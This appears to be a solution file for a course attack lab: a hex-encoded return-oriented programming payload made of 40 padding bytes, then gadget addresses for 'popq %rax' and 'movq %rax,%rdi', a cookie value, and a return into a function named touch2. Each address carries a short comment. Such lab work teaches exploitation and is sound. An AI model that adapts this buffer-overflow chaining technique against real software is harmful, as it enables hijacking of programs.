30 30 30 30 30 
30 30 30 30 30 
30 30 30 30 30 
30 30 30 30 30 
30 30 30 30 30 
30 30 30 30 30 
30 30 30 30 30 
30 30 30 30 30 

ab 19 40 00 00 00 00 00  /* ret to address of addval_219 + 4 (popq %rax) */
fa 97 b9 59 00 00 00 00  /* the cookie is poped to rax now */
c5 19 40 00 00 00 00 00  /* go to setval_426 + 2 (movq rax rdi) */
ec 17 40 00 00 00 00 00  /* ret to address of touch2 */
